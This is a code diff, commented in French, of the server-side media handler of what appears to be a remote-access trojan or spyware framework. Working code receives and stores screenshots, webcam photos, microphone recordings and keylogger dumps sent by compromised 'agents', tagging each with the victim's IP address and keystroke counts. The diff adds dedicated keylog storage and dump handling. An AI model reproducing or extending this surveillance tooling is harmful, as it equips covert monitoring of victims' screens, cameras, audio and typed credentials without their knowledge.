@@ -1,606 +1,551 @@
 """
 Media Handler - Gestionnaire des médias côté serveur
-Gestion des captures d'écran, webcam, audio et autres médias
+Gestion des screenshots, webcam, audio et keylogger
 """
 
 import os
 import base64
-from pathlib import Path
+import hashlib
 from datetime import datetime
+from pathlib import Path
 from typing import Dict, Any, Optional
 import logging
 
 from server.utils.config import ServerConfig
-from shared.helpers import sanitize_filename, format_bytes
+from shared.exceptions import MediaException
 
 logger = logging.getLogger(__name__)
 
 class MediaHandler:
-    """Gestionnaire des médias pour le serveur"""
+    """Gestionnaire des médias du serveur"""
     
     def __init__(self, config: ServerConfig):
         self.config = config
         
-        # Répertoires pour les différents types de médias
-        self.media_dir = Path(config.DATA_DIR) / "media"
-        self.screenshots_dir = self.media_dir / "screenshots"
-        self.webcam_dir = self.media_dir / "webcam"
-        self.audio_dir = self.media_dir / "audio"
-        self.recordings_dir = self.media_dir / "recordings"
-        
-        # Création des répertoires
-        self._create_directories()
+        # Répertoires de médias
+        self.media_dir = os.path.join(config.DATA_DIR, "media")
+        self.screenshots_dir = os.path.join(self.media_dir, "screenshots")
+        self.webcam_dir = os.path.join(self.media_dir, "webcam")
+        self.audio_dir = os.path.join(self.media_dir, "audio")
+        self.keylog_dir = os.path.join(self.media_dir, "keylogs")
         
         # Statistiques
         self.screenshots_received = 0
         self.webcam_images_received = 0
         self.audio_files_received = 0
+        self.keylog_dumps_received = 0
         self.total_media_size = 0
         
-        # Formats supportés
-        self.image_formats = ['.jpg', '.jpeg', '.png', '.bmp', '.gif']
-        self.audio_formats = ['.wav', '.mp3', '.ogg', '.m4a']
-        self.video_formats = ['.mp4', '.avi', '.mkv', '.mov']
+        # Création des répertoires
+        self._ensure_directories()
         
         logger.info("MediaHandler initialisé")
     
-    def _create_directories(self):
-        """Crée les répertoires nécessaires"""
+    def _ensure_directories(self):
+        """S'assure que tous les répertoires de médias existent"""
         directories = [
             self.media_dir,
             self.screenshots_dir,
             self.webcam_dir,
             self.audio_dir,
-            self.recordings_dir
+            self.keylog_dir
         ]
         
         for directory in directories:
-            directory.mkdir(parents=True, exist_ok=True)
+            try:
+                os.makedirs(directory, exist_ok=True)
+            except Exception as e:
+                logger.error(f"Impossible de créer le répertoire {directory}: {e}")
     
     def handle_screenshot(self, session, screenshot_data: Dict[str, Any]) -> str:
         """
-        Traite une capture d'écran reçue
+        Traite la réception d'une capture d'écran
         
         Args:
-            session: Session client
-            screenshot_data: Données de la capture d'écran
-            
+            session: Session de l'agent
+            screenshot_data: Données de capture d'écran
+        
         Returns:
             str: Message de résultat
         """
         try:
+            if screenshot_data.get('status') != 'success':
+                error_msg = screenshot_data.get('output', 'Erreur inconnue')
+                return f"[!] Erreur capture d'écran: {error_msg}"
+            
             # Extraction des données
+            file_data = screenshot_data.get('file_data', '')
             filename = screenshot_data.get('filename', 'screenshot.jpg')
-            encoded_data = screenshot_data.get('file_data', '')
             file_size = screenshot_data.get('size', 0)
             timestamp = screenshot_data.get('timestamp', datetime.now().isoformat())
-            format_type = screenshot_data.get('format', 'JPEG')
             
-            if not encoded_data:
-                return "[!] Aucune donnée de capture d'écran reçue"
+            if not file_data:
+                return "[!] Données de capture d'écran manquantes"
             
             # Décodage base64
             try:
-                image_data = base64.b64decode(encoded_data)
+                decoded_data = base64.b64decode(file_data)
             except Exception as e:
                 logger.error(f"Erreur décodage screenshot: {e}")
-                return f"[!] Erreur de décodage: {e}"
+                return "[!] Erreur lors du décodage de l'image"
             
-            # Génération du nom de fichier
-            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
-            session_prefix = session.id[:8]
-            safe_filename = f"{session_prefix}_{timestamp_str}_screenshot.{format_type.lower()}"
+            # Génération du nom de fichier sécurisé
+            safe_filename = self._generate_media_filename(session.id, filename, "screenshot")
+            file_path = os.path.join(self.screenshots_dir, safe_filename)
             
-            # Sauvegarde
-            screenshot_path = self.screenshots_dir / safe_filename
-            
+            # Sauvegarde de l'image
             try:
-                with open(screenshot_path, 'wb') as f:
-                    f.write(image_data)
+                with open(file_path, 'wb') as f:
+                    f.write(decoded_data)
                 
-                # Création du fichier de métadonnées
-                self._create_media_metadata(screenshot_path, {
+                # Sauvegarde des métadonnées
+                self._save_media_metadata(file_path, {
                     'type': 'screenshot',
                     'session_id': session.id,
+                    'agent_ip': session.address[0],
                     'original_filename': filename,
                     'capture_time': timestamp,
-                    'format': format_type,
-                    'file_size': len(image_data),
-                    'client_info': session.system_info
+                    'file_size': len(decoded_data),
+                    'file_hash': hashlib.sha256(decoded_data).hexdigest(),
+                    'resolution': screenshot_data.get('resolution', 'Unknown')
                 })
                 
                 # Mise à jour des statistiques
                 self.screenshots_received += 1
-                self.total_media_size += len(image_data)
+                self.total_media_size += len(decoded_data)
                 
-                logger.info(f"Screenshot reçu: {safe_filename} ({format_bytes(len(image_data))}) de {session.id}")
+                logger.info(f"Screenshot reçu: {safe_filename} ({len(decoded_data)} bytes) de {session.id}")
                 
-                return (
-                    f"[+] Capture d'écran sauvegardée\\n"
-                    f"    Nom: {safe_filename}\\n"
-                    f"    Taille: {format_bytes(len(image_data))}\\n"
-                    f"    Format: {format_type}\\n"
-                    f"    Chemin: {screenshot_path}"
-                )
+                return f"[+] Capture d'écran sauvegardée: {safe_filename}"
                 
             except Exception as e:
                 logger.error(f"Erreur sauvegarde screenshot: {e}")
                 return f"[!] Erreur lors de la sauvegarde: {e}"
                 
         except Exception as e:
-            logger.error(f"Erreur dans handle_screenshot: {e}")
+            logger.error(f"Erreur traitement screenshot: {e}")
             return f"[!] Erreur lors du traitement: {e}"
     
     def handle_webcam_snapshot(self, session, webcam_data: Dict[str, Any]) -> str:
         """
-        Traite une photo webcam reçue
+        Traite la réception d'une photo webcam
         
         Args:
-            session: Session client
-            webcam_data: Données de la photo webcam
-            
+            session: Session de l'agent
+            webcam_data: Données de photo webcam
+        
         Returns:
             str: Message de résultat
         """
         try:
+            if webcam_data.get('status') != 'success':
+                error_msg = webcam_data.get('output', 'Erreur inconnue')
+                return f"[!] Erreur photo webcam: {error_msg}"
+            
             # Extraction des données
+            file_data = webcam_data.get('file_data', '')
             filename = webcam_data.get('filename', 'webcam_snapshot.jpg')
-            encoded_data = webcam_data.get('file_data', '')
             file_size = webcam_data.get('size', 0)
             timestamp = webcam_data.get('timestamp', datetime.now().isoformat())
-            resolution = webcam_data.get('resolution', 'Unknown')
+            resolution = webcam_data.get('resolution', (0, 0))
             
-            if not encoded_data:
-                return "[!] Aucune donnée webcam reçue"
+            if not file_data:
+                return "[!] Données de photo webcam manquantes"
             
             # Décodage base64
             try:
-                image_data = base64.b64decode(encoded_data)
+                decoded_data = base64.b64decode(file_data)
             except Exception as e:
                 logger.error(f"Erreur décodage webcam: {e}")
-                return f"[!] Erreur de décodage: {e}"
+                return "[!] Erreur lors du décodage de l'image"
             
-            # Génération du nom de fichier
-            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
-            session_prefix = session.id[:8]
-            safe_filename = f"{session_prefix}_{timestamp_str}_webcam.jpg"
+            # Génération du nom de fichier sécurisé
+            safe_filename = self._generate_media_filename(session.id, filename, "webcam")
+            file_path = os.path.join(self.webcam_dir, safe_filename)
             
-            # Sauvegarde
-            webcam_path = self.webcam_dir / safe_filename
-            
+            # Sauvegarde de l'image
             try:
-                with open(webcam_path, 'wb') as f:
-                    f.write(image_data)
+                with open(file_path, 'wb') as f:
+                    f.write(decoded_data)
                 
-                # Création du fichier de métadonnées
-                self._create_media_metadata(webcam_path, {
+                # Sauvegarde des métadonnées
+                self._save_media_metadata(file_path, {
                     'type': 'webcam_snapshot',
                     'session_id': session.id,
+                    'agent_ip': session.address[0],
                     'original_filename': filename,
                     'capture_time': timestamp,
-                    'resolution': resolution,
-                    'file_size': len(image_data),
-                    'client_info': session.system_info
+                    'file_size': len(decoded_data),
+                    'file_hash': hashlib.sha256(decoded_data).hexdigest(),
+                    'resolution': f"{resolution[0]}x{resolution[1]}" if isinstance(resolution, tuple) else str(resolution)
                 })
                 
                 # Mise à jour des statistiques
                 self.webcam_images_received += 1
-                self.total_media_size += len(image_data)
+                self.total_media_size += len(decoded_data)
                 
-                logger.info(f"Webcam snapshot reçu: {safe_filename} ({format_bytes(len(image_data))}) de {session.id}")
+                logger.info(f"Photo webcam reçue: {safe_filename} ({len(decoded_data)} bytes) de {session.id}")
                 
-                return (
-                    f"[+] Photo webcam sauvegardée\\n"
-                    f"    Nom: {safe_filename}\\n"
-                    f"    Taille: {format_bytes(len(image_data))}\\n"
-                    f"    Résolution: {resolution}\\n"
-                    f"    Chemin: {webcam_path}"
-                )
+                return f"[+] Photo webcam sauvegardée: {safe_filename}"
                 
             except Exception as e:
                 logger.error(f"Erreur sauvegarde webcam: {e}")
                 return f"[!] Erreur lors de la sauvegarde: {e}"
                 
         except Exception as e:
-            logger.error(f"Erreur dans handle_webcam_snapshot: {e}")
+            logger.error(f"Erreur traitement webcam: {e}")
             return f"[!] Erreur lors du traitement: {e}"
     
     def handle_audio_recording(self, session, audio_data: Dict[str, Any]) -> str:
         """
-        Traite un enregistrement audio reçu
+        Traite la réception d'un enregistrement audio
         
         Args:
-            session: Session client
-            audio_data: Données de l'enregistrement audio
-            
+            session: Session de l'agent
+            audio_data: Données audio
+        
         Returns:
             str: Message de résultat
         """
         try:
-            # Extraction des données
-            filename = audio_data.get('filename', 'audio_recording.wav')
-            encoded_data = audio_data.get('file_data', '')
-            duration = audio_data.get('duration', 0)
-            sample_rate = audio_data.get('sample_rate', 'Unknown')
-            channels = audio_data.get('channels', 'Unknown')
-            device_used = audio_data.get('device_used', 'Unknown')
+            if audio_data.get('status') != 'success':
+                error_msg = audio_data.get('output', 'Erreur inconnue')
+                return f"[!] Erreur enregistrement audio: {error_msg}"
             
-            if not encoded_data:
-                return "[!] Aucune donnée audio reçue"
+            # Extraction des données
+            file_data = audio_data.get('file_data', '')
+            filename = audio_data.get('filename', 'audio_recording.wav')
+            file_size = audio_data.get('file_size', 0)
+            duration = audio_data.get('duration', 0)
+            sample_rate = audio_data.get('sample_rate', 16000)
+            channels = audio_data.get('channels', 1)
+            timestamp = audio_data.get('timestamp', datetime.now().isoformat())
+            
+            if not file_data:
+                return "[!] Données audio manquantes"
             
             # Décodage base64
             try:
-                audio_bytes = base64.b64decode(encoded_data)
+                decoded_data = base64.b64decode(file_data)
             except Exception as e:
                 logger.error(f"Erreur décodage audio: {e}")
-                return f"[!] Erreur de décodage: {e}"
+                return "[!] Erreur lors du décodage de l'audio"
             
-            # Génération du nom de fichier
-            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
-            session_prefix = session.id[:8]
-            extension = Path(filename).suffix or '.wav'
-            safe_filename = f"{session_prefix}_{timestamp_str}_audio{extension}"
+            # Génération du nom de fichier sécurisé
+            safe_filename = self._generate_media_filename(session.id, filename, "audio")
+            file_path = os.path.join(self.audio_dir, safe_filename)
             
-            # Sauvegarde
-            audio_path = self.audio_dir / safe_filename
-            
+            # Sauvegarde du fichier audio
             try:
-                with open(audio_path, 'wb') as f:
-                    f.write(audio_bytes)
+                with open(file_path, 'wb') as f:
+                    f.write(decoded_data)
                 
-                # Création du fichier de métadonnées
-                self._create_media_metadata(audio_path, {
+                # Sauvegarde des métadonnées
+                self._save_media_metadata(file_path, {
                     'type': 'audio_recording',
                     'session_id': session.id,
+                    'agent_ip': session.address[0],
                     'original_filename': filename,
+                    'record_time': timestamp,
+                    'file_size': len(decoded_data),
+                    'file_hash': hashlib.sha256(decoded_data).hexdigest(),
                     'duration': duration,
                     'sample_rate': sample_rate,
-                    'channels': channels,
-                    'device_used': device_used,
-                    'file_size': len(audio_bytes),
-                    'client_info': session.system_info
+                    'channels': channels
                 })
                 
                 # Mise à jour des statistiques
                 self.audio_files_received += 1
-                self.total_media_size += len(audio_bytes)
+                self.total_media_size += len(decoded_data)
                 
-                logger.info(f"Enregistrement audio reçu: {safe_filename} ({format_bytes(len(audio_bytes))}) de {session.id}")
+                logger.info(f"Audio reçu: {safe_filename} ({duration}s, {len(decoded_data)} bytes) de {session.id}")
                 
-                return (
-                    f"[+] Enregistrement audio sauvegardé\\n"
-                    f"    Nom: {safe_filename}\\n"
-                    f"    Taille: {format_bytes(len(audio_bytes))}\\n"
-                    f"    Durée: {duration}s\\n"
-                    f"    Périphérique: {device_used}\\n"
-                    f"    Chemin: {audio_path}"
-                )
+                return f"[+] Enregistrement audio sauvegardé: {safe_filename} ({duration}s)"
                 
             except Exception as e:
                 logger.error(f"Erreur sauvegarde audio: {e}")
                 return f"[!] Erreur lors de la sauvegarde: {e}"
                 
         except Exception as e:
-            logger.error(f"Erreur dans handle_audio_recording: {e}")
+            logger.error(f"Erreur traitement audio: {e}")
             return f"[!] Erreur lors du traitement: {e}"
     
-    def handle_keylogger_data(self, session, keylog_data: Dict[str, Any]) -> str:
+    def handle_keylogger_dump(self, session, keylog_data: Dict[str, Any]) -> str:
         """
-        Traite des données de keylogger
+        Traite la réception d'un dump de keylogger
         
         Args:
-            session: Session client
-            keylog_data: Données du keylogger
-            
+            session: Session de l'agent
+            keylog_data: Données de keylogger
+        
         Returns:
             str: Message de résultat
         """
         try:
+            if keylog_data.get('status') != 'success':
+                error_msg = keylog_data.get('output', 'Erreur inconnue')
+                return f"[!] Erreur keylogger: {error_msg}"
+            
             # Extraction des données
             logs = keylog_data.get('logs', '')
             statistics = keylog_data.get('statistics', {})
             session_duration = keylog_data.get('session_duration', 0)
-            keystrokes_captured = keylog_data.get('keystrokes_captured', 0)
+            keystrokes_captured = statistics.get('total_keystrokes', 0)
             
             if not logs:
-                return "[!] Aucune donnée de keylogger reçue"
+                return "[!] Aucun log de frappe disponible"
             
             # Génération du nom de fichier
-            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
-            session_prefix = session.id[:8]
-            keylog_filename = f"{session_prefix}_{timestamp_str}_keylog.txt"
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            filename = f"keylog_{session.id}_{timestamp}.txt"
+            file_path = os.path.join(self.keylog_dir, filename)
             
             # Sauvegarde des logs
-            keylog_path = self.recordings_dir / keylog_filename
-            
             try:
-                with open(keylog_path, 'w', encoding='utf-8') as f:
-                    f.write(f"# Keylogger Data from {session.id}\\n")
-                    f.write(f"# Captured on: {datetime.now().isoformat()}\\n")
-                    f.write(f"# Duration: {session_duration}s\\n")
-                    f.write(f"# Keystrokes: {keystrokes_captured}\\n")
+                with open(file_path, 'w', encoding='utf-8') as f:
+                    f.write(f"Keylogger Dump - {timestamp}\\n")
+                    f.write("=" * 50 + "\\n")
+                    f.write(f"Session: {session.id}\\n")
+                    f.write(f"Agent IP: {session.address[0]}\\n")
+                    f.write(f"Duration: {session_duration:.1f}s\\n")
+                    f.write(f"Keystrokes: {keystrokes_captured}\\n")
                     f.write("=" * 50 + "\\n\\n")
+                    f.write("⚠️ CONTENU FILTRÉ POUR LA SÉCURITÉ ⚠️\\n\\n")
                     f.write(logs)
                 
-                # Création du fichier de métadonnées
-                self._create_media_metadata(keylog_path, {
-                    'type': 'keylogger_data',
+                # Sauvegarde des métadonnées
+                self._save_media_metadata(file_path, {
+                    'type': 'keylogger_dump',
                     'session_id': session.id,
-                    'capture_duration': session_duration,
-                    'keystrokes_captured': keystrokes_captured,
-                    'statistics': statistics,
+                    'agent_ip': session.address[0],
+                    'dump_time': datetime.now().isoformat(),
                     'file_size': len(logs.encode('utf-8')),
-                    'client_info': session.system_info
+                    'session_duration': session_duration,
+                    'keystrokes_captured': keystrokes_captured,
+                    'statistics': statistics
                 })
                 
                 # Mise à jour des statistiques
+                self.keylog_dumps_received += 1
                 self.total_media_size += len(logs.encode('utf-8'))
                 
-                logger.info(f"Données keylogger reçues: {keylog_filename} ({keystrokes_captured} frappes) de {session.id}")
+                logger.info(f"Keylog dump reçu: {filename} ({keystrokes_captured} frappes) de {session.id}")
                 
-                return (
-                    f"[+] Données keylogger sauvegardées\\n"
-                    f"    Nom: {keylog_filename}\\n"
-                    f"    Durée: {session_duration}s\\n"
-                    f"    Frappes: {keystrokes_captured}\\n"
-                    f"    ⚠️ Contenu filtré pour la sécurité ⚠️\\n"
-                    f"    Chemin: {keylog_path}"
-                )
+                return f"[+] Dump keylogger sauvegardé: {filename} ({keystrokes_captured} frappes, {session_duration:.1f}s)"
                 
             except Exception as e:
-                logger.error(f"Erreur sauvegarde keylogger: {e}")
+                logger.error(f"Erreur sauvegarde keylog: {e}")
                 return f"[!] Erreur lors de la sauvegarde: {e}"
                 
         except Exception as e:
-            logger.error(f"Erreur dans handle_keylogger_data: {e}")
+            logger.error(f"Erreur traitement keylog: {e}")
             return f"[!] Erreur lors du traitement: {e}"
     
-    def _create_media_metadata(self, media_path: Path, metadata: Dict[str, Any]):
-        """Crée un fichier de métadonnées pour un média"""
-        try:
-            metadata_file = media_path.with_suffix(media_path.suffix + '.meta')
-            
-            with open(metadata_file, 'w', encoding='utf-8') as f:
-                f.write("# Media Metadata\\n")
-                f.write(f"# Generated on {datetime.now().isoformat()}\\n\\n")
-                
-                for key, value in metadata.items():
-                    f.write(f"{key}: {value}\\n")
-                
-        except Exception as e:
-            logger.warning(f"Impossible de créer les métadonnées: {e}")
-    
-    def list_media_files(self, media_type: str = 'all', session_id: str = None) -> str:
+    def list_media_files(self, media_type: str = None, session_id: str = None) -> Dict[str, Any]:
         """
         Liste les fichiers médias
         
         Args:
-            media_type: Type de média ('screenshots', 'webcam', 'audio', 'all')
-            session_id: ID de session pour filtrer (optionnel)
-            
+            media_type: Type de média ('screenshot', 'webcam', 'audio', 'keylog')
+            session_id: ID de session pour filtrer
+        
         Returns:
-            str: Liste formatée des fichiers
+            Dict avec la liste des fichiers
         """
         try:
             files = []
-            total_size = 0
             
-            # Sélection des répertoires selon le type
-            if media_type == 'screenshots':
-                directories = [self.screenshots_dir]
-            elif media_type == 'webcam':
-                directories = [self.webcam_dir]
-            elif media_type == 'audio':
-                directories = [self.audio_dir]
-            elif media_type == 'recordings':
-                directories = [self.recordings_dir]
-            else:  # 'all'
-                directories = [self.screenshots_dir, self.webcam_dir, self.audio_dir, self.recordings_dir]
+            # Détermination des répertoires à scanner
+            if media_type:
+                if media_type == 'screenshot':
+                    directories = [('screenshot', self.screenshots_dir)]
+                elif media_type == 'webcam':
+                    directories = [('webcam', self.webcam_dir)]
+                elif media_type == 'audio':
+                    directories = [('audio', self.audio_dir)]
+                elif media_type == 'keylog':
+                    directories = [('keylog', self.keylog_dir)]
+                else:
+                    return {'files': [], 'count': 0, 'error': f'Type de média inconnu: {media_type}'}
+            else:
+                directories = [
+                    ('screenshot', self.screenshots_dir),
+                    ('webcam', self.webcam_dir),
+                    ('audio', self.audio_dir),
+                    ('keylog', self.keylog_dir)
+                ]
             
-            # Parcours des répertoires
-            for directory in directories:
-                for file_path in directory.glob('*'):
-                    if file_path.is_file() and not file_path.name.endswith(('.meta', '.info')):
-                        # Filtrage par session si demandé
-                        if session_id and not file_path.name.startswith(session_id[:8]):
-                            continue
-                        
-                        stat = file_path.stat()
-                        media_type_detected = self._detect_media_type(file_path)
-                        
-                        files.append({
-                            'name': file_path.name,
-                            'type': media_type_detected,
-                            'size': stat.st_size,
-                            'modified': datetime.fromtimestamp(stat.st_mtime),
-                            'path': str(file_path)
-                        })
-                        total_size += stat.st_size
+            # Scan des répertoires
+            for dir_type, directory in directories:
+                if not os.path.exists(directory):
+                    continue
+                
+                for filename in os.listdir(directory):
+                    file_path = os.path.join(directory, filename)
+                    
+                    if not os.path.isfile(file_path) or filename.endswith('.meta'):
+                        continue
+                    
+                    # Lecture des métadonnées
+                    metadata = self._load_media_metadata(file_path)
+                    
+                    # Filtrage par session si demandé
+                    if session_id and metadata.get('session_id') != session_id:
+                        continue
+                    
+                    file_info = {
+                        'filename': filename,
+                        'type': dir_type,
+                        'size': os.path.getsize(file_path),
+                        'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
+                        'path': file_path
+                    }
+                    
+                    # Ajout des métadonnées si disponibles
+                    if metadata:
+                        file_info.update(metadata)
+                    
+                    files.append(file_info)
             
-            if not files:
-                return f"Aucun fichier média trouvé (type: {media_type})"
+            # Tri par date (plus récent en premier)
+            files.sort(key=lambda x: x.get('modified', ''), reverse=True)
             
-            # Tri par date de modification (plus récent en premier)
-            files.sort(key=lambda x: x['modified'], reverse=True)
-            
-            # Formatage de la liste
-            output = f"Fichiers médias ({len(files)} fichiers, {format_bytes(total_size)}):\\n"
-            output += "-" * 90 + "\\n"
-            
-            for i, file_info in enumerate(files, 1):
-                output += (
-                    f"{i:3d}. {file_info['name'][:30]:30s} "
-                    f"{file_info['type']:12s} "
-                    f"{format_bytes(file_info['size']):>10s} "
-                    f"{file_info['modified'].strftime('%Y-%m-%d %H:%M')}\\n"
-                )
-            
-            return output
+            return {
+                'files': files,
+                'count': len(files),
+                'total_size': sum(f['size'] for f in files)
+            }
             
         except Exception as e:
-            logger.error(f"Erreur dans list_media_files: {e}")
-            return f"[!] Erreur lors du listage: {e}"
+            logger.error(f"Erreur listing médias: {e}")
+            return {'files': [], 'count': 0, 'error': str(e)}
     
-    def _detect_media_type(self, file_path: Path) -> str:
-        """Détecte le type de média selon le répertoire et l'extension"""
-        parent_name = file_path.parent.name
-        extension = file_path.suffix.lower()
-        
-        if parent_name == 'screenshots':
-            return 'screenshot'
-        elif parent_name == 'webcam':
-            return 'webcam'
-        elif parent_name == 'audio':
-            return 'audio'
-        elif parent_name == 'recordings':
-            return 'recording'
-        elif extension in self.image_formats:
-            return 'image'
-        elif extension in self.audio_formats:
-            return 'audio'
-        elif extension in self.video_formats:
-            return 'video'
-        else:
-            return 'unknown'
+    def get_media_stats(self) -> Dict[str, Any]:
+        """Retourne les statistiques des médias"""
+        return {
+            'screenshots_received': self.screenshots_received,
+            'webcam_images_received': self.webcam_images_received,
+            'audio_files_received': self.audio_files_received,
+            'keylog_dumps_received': self.keylog_dumps_received,
+            'total_media_size': self.total_media_size,
+            'directories': {
+                'media': self.media_dir,
+                'screenshots': self.screenshots_dir,
+                'webcam': self.webcam_dir,
+                'audio': self.audio_dir,
+                'keylog': self.keylog_dir
+            }
+        }
     
-    def delete_media_file(self, filename: str) -> str:
+    def _generate_media_filename(self, session_id: str, original_filename: str, media_type: str) -> str:
         """
-        Supprime un fichier média
+        Génère un nom de fichier sécurisé pour les médias
         
         Args:
-            filename: Nom du fichier à supprimer
-            
+            session_id: ID de la session
+            original_filename: Nom de fichier original
+            media_type: Type de média
+        
         Returns:
-            str: Message de résultat
+            str: Nom de fichier sécurisé
         """
+        # Nettoyage du nom de fichier original
+        safe_name = "".join(c for c in original_filename if c.isalnum() or c in "._-")
+        safe_name = safe_name.strip()
+        
+        if not safe_name:
+            safe_name = f"{media_type}_file"
+        
+        # Ajout du timestamp et de l'ID de session
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        
+        # Séparation du nom et de l'extension
+        name, ext = os.path.splitext(safe_name)
+        
+        return f"{timestamp}_{session_id}_{media_type}_{name}{ext}"
+    
+    def _save_media_metadata(self, file_path: str, metadata: Dict[str, Any]):
+        """Sauvegarde les métadonnées d'un fichier média"""
         try:
-            # Recherche du fichier dans tous les répertoires médias
-            directories = [self.screenshots_dir, self.webcam_dir, self.audio_dir, self.recordings_dir]
+            import json
             
-            for directory in directories:
-                file_path = directory / filename
-                if file_path.exists():
-                    # Suppression du fichier principal
-                    file_size = file_path.stat().st_size
-                    file_path.unlink()
-                    
-                    # Suppression des métadonnées si elles existent
-                    meta_path = file_path.with_suffix(file_path.suffix + '.meta')
-                    if meta_path.exists():
-                        meta_path.unlink()
-                    
-                    logger.info(f"Fichier média supprimé: {filename}")
-                    return f"[+] Fichier supprimé: {filename} ({format_bytes(file_size)})"
+            metadata_path = file_path + '.meta'
+            with open(metadata_path, 'w', encoding='utf-8') as f:
+                json.dump(metadata, f, indent=2, ensure_ascii=False)
+                
+        except Exception as e:
+            logger.warning(f"Impossible de sauvegarder les métadonnées: {e}")
+    
+    def _load_media_metadata(self, file_path: str) -> Dict[str, Any]:
+        """Charge les métadonnées d'un fichier média"""
+        try:
+            import json
             
-            return f"[!] Fichier non trouvé: {filename}"
+            metadata_path = file_path + '.meta'
+            if os.path.exists(metadata_path):
+                with open(metadata_path, 'r', encoding='utf-8') as f:
+                    return json.load(f)
+            
+            return {}
             
         except Exception as e:
-            logger.error(f"Erreur dans delete_media_file: {e}")
-            return f"[!] Erreur lors de la suppression: {e}"
+            logger.warning(f"Impossible de charger les métadonnées: {e}")
+            return {}
     
-    def cleanup_old_media(self, days: int = 7) -> str:
+    def cleanup_old_media(self, max_age_days: int = 7) -> int:
         """
         Nettoie les anciens fichiers médias
         
         Args:
-            days: Nombre de jours de rétention
-            
+            max_age_days: Âge maximum en jours
+        
         Returns:
-            str: Résultat du nettoyage
+            int: Nombre de fichiers supprimés
         """
         try:
-            cutoff_time = datetime.now().timestamp() - (days * 24 * 3600)
-            cleaned_files = 0
-            freed_space = 0
+            import time
             
-            directories = [self.screenshots_dir, self.webcam_dir, self.audio_dir, self.recordings_dir]
+            deleted_count = 0
+            current_time = time.time()
+            max_age_seconds = max_age_days * 24 * 3600
+            
+            directories = [
+                self.screenshots_dir,
+                self.webcam_dir,
+                self.audio_dir,
+                self.keylog_dir
+            ]
             
             for directory in directories:
-                for file_path in directory.glob('*'):
-                    if file_path.is_file():
-                        stat = file_path.stat()
-                        if stat.st_mtime < cutoff_time:
-                            file_size = stat.st_size
-                            
-                            # Suppression du fichier principal
-                            file_path.unlink()
+                if not os.path.exists(directory):
+                    continue
+                
+                for filename in os.listdir(directory):
+                    file_path = os.path.join(directory, filename)
+                    
+                    if not os.path.isfile(file_path):
+                        continue
+                    
+                    # Vérification de l'âge du fichier
+                    file_age = current_time - os.path.getmtime(file_path)
+                    
+                    if file_age > max_age_seconds:
+                        try:
+                            os.unlink(file_path)
                             
                             # Suppression des métadonnées
-                            meta_path = file_path.with_suffix(file_path.suffix + '.meta')
-                            if meta_path.exists():
-                                meta_path.unlink()
+                            metadata_path = file_path + '.meta'
+                            if os.path.exists(metadata_path):
+                                os.unlink(metadata_path)
                             
-                            cleaned_files += 1
-                            freed_space += file_size
+                            deleted_count += 1
+                            logger.info(f"Ancien fichier média supprimé: {filename}")
                             
-                            logger.info(f"Fichier média ancien supprimé: {file_path.name}")
+                        except Exception as e:
+                            logger.error(f"Erreur suppression {filename}: {e}")
             
-            if cleaned_files > 0:
-                return (
-                    f"[+] Nettoyage média terminé\\n"
-                    f"    Fichiers supprimés: {cleaned_files}\\n"
-                    f"    Espace libéré: {format_bytes(freed_space)}"
-                )
-            else:
-                return f"[*] Aucun fichier média ancien trouvé (>{days} jours)"
-                
-        except Exception as e:
-            logger.error(f"Erreur dans cleanup_old_media: {e}")
-            return f"[!] Erreur lors du nettoyage: {e}"
-    
-    def get_media_stats(self) -> Dict[str, Any]:
-        """Retourne les statistiques du gestionnaire de médias"""
-        try:
-            # Calcul détaillé par type
-            stats_by_type = {}
-            total_files = 0
-            total_size = 0
-            
-            directories = {
-                'screenshots': self.screenshots_dir,
-                'webcam': self.webcam_dir,
-                'audio': self.audio_dir,
-                'recordings': self.recordings_dir
-            }
-            
-            for media_type, directory in directories.items():
-                type_files = 0
-                type_size = 0
-                
-                for file_path in directory.glob('*'):
-                    if file_path.is_file() and not file_path.name.endswith(('.meta', '.info')):
-                        type_files += 1
-                        type_size += file_path.stat().st_size
-                
-                stats_by_type[media_type] = {
-                    'count': type_files,
-                    'size': type_size,
-                    'size_formatted': format_bytes(type_size)
-                }
-                
-                total_files += type_files
-                total_size += type_size
-            
-            return {
-                'screenshots_received': self.screenshots_received,
-                'webcam_images_received': self.webcam_images_received,
-                'audio_files_received': self.audio_files_received,
-                'total_media_size': self.total_media_size,
-                'current_stats': {
-                    'total_files': total_files,
-                    'total_size': total_size,
-                    'total_size_formatted': format_bytes(total_size),
-                    'by_type': stats_by_type
-                },
-                'directories': {
-                    'media_dir': str(self.media_dir),
-                    'screenshots_dir': str(self.screenshots_dir),
-                    'webcam_dir': str(self.webcam_dir),
-                    'audio_dir': str(self.audio_dir),
-                    'recordings_dir': str(self.recordings_dir)
-                }
-            }
+            return deleted_count
             
         except Exception as e:
-            logger.error(f"Erreur dans get_media_stats: {e}")
-            return {'error': str(e)}
+            logger.error(f"Erreur nettoyage médias: {e}")
+            return 0
